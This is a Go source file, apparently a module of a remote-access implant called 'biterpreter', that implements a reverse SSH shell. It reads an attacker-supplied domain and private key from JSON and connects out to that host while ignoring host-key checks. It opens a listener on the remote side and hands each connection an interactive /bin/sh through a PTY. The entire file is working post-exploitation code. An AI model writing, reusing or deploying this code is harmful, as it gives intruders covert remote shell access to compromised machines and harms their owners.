// +build linux darwin


package biterpreter

import (
	
	"io"
	//"log"
	"net"
	"os/exec"
	"syscall"

	"github.com/kr/pty"
	"golang.org/x/crypto/ssh"
	"golang.org/x/crypto/ssh/terminal"

	//Fixes
	"time"
	"encoding/json"
	//"fmt"
)

type InjectRevSshShellBichito struct {
    Domain string   `json:"domain"`
    Sshkey string   `json:"sshkey"`
}


func RevSshShell(jsonparams string) (bool,string){

	//Debug
	//fmt.Println(jsonparams)

	var revsshshellparams *InjectRevSshShellBichito
	errDaws := json.Unmarshal([]byte(jsonparams),&revsshshellparams)
	if errDaws != nil {
		return true,"Parameters JSON Decoding error:"+errDaws.Error()
	}

	auth, err := loadPrivateKey(revsshshellparams.Sshkey)
	if err != nil {
		return true,"Load Key String error"
	}

	config := &ssh.ClientConfig{
		User: "anonymous",
		Auth: nil,
	    HostKeyCallback: func(hostname string, remote net.Addr, key ssh.PublicKey) error {
            return nil
        },
        Timeout:time.Second * 1,
	}

	config.Auth = append(config.Auth, auth)

	// Dial the SSH connection
	sshConn, err := ssh.Dial("tcp", revsshshellparams.Domain+":22", config)
	if err != nil {
		return true,"Error: error dialing remote host:"+err.Error()
	}


	// Listen on remote
	l, err := sshConn.Listen("tcp", "127.0.0.1:2222")
	if err != nil {
		return true,"Error: error listening on remote host:"+err.Error()
	}

	go listenSSH(sshConn,l)

	return false,"Success: Rev SSH Shell Connected to Staging"
}


func listenSSH(sshconn *ssh.Client,l net.Listener){

	defer sshconn.Close()

	// Start accepting shell connections
	for {
		conn, err := l.Accept()
		if err != nil {
			continue
		}

		handleConnection(conn)

		return
	}
}

func handleConnection(c net.Conn) {
	defer c.Close()

	// Start the command
	cmd := exec.Command("/bin/sh")

	// Create PTY
	pty, tty, err := pty.Open()
	if err != nil {
		//log.Printf("error: could not open PTY: %s", err)
		return
	}
	defer tty.Close()
	defer pty.Close()

	// Put the TTY into raw mode
	_, err = terminal.MakeRaw(int(tty.Fd()))
	if err != nil {
		//log.Printf("warn: could not make TTY raw: %s", err)
	}

	// Hook everything up
	cmd.Stdout = tty
	cmd.Stdin = tty
	cmd.Stderr = tty
	if cmd.SysProcAttr == nil {
		cmd.SysProcAttr = &syscall.SysProcAttr{}
	}

	cmd.SysProcAttr.Setctty = true
	cmd.SysProcAttr.Setsid = true

	// Start command
	err = cmd.Start()
	if err != nil {
		//log.Printf("error: could not start command: %s", err)
		return
	}

	errs := make(chan error, 3)

	go func() {
		_, err := io.Copy(c, pty)
		errs <- err
	}()
	go func() {
		_, err := io.Copy(pty, c)
		errs <- err
	}()
	go func() {
		errs <- cmd.Wait()
	}()

	// Wait for a single error, then shut everything down. Since returning from
	// this function closes the connection, we just read a single error and
	// then continue.
	<-errs
}

func loadPrivateKey(keyString string) (ssh.AuthMethod, error) {


	signer, signerErr := ssh.ParsePrivateKey([]byte(keyString))
	if signerErr != nil {
		return nil, signerErr
	}
	return ssh.PublicKeys(signer), nil
}